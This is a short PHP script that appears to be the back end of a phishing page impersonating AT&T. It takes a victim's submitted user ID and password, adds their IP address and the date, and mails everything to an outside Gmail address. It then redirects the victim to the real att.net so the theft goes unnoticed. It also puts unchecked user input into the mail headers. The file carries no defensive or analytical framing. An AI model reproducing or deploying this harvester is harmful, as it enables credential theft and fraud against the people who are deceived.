<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "===================( OLUWA SUCCESS )===================\n";
$message .= "UserID: ".$_POST['userid']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "============( SIGNED BY ABILITY - ABLE GOD )==============\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--------------------------------------\n";

$recipient = "banklogs1@gmail.com";
$subject = "ATT Composing";
$headers = "From: ATT.NET";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://att.net");

	   }


?>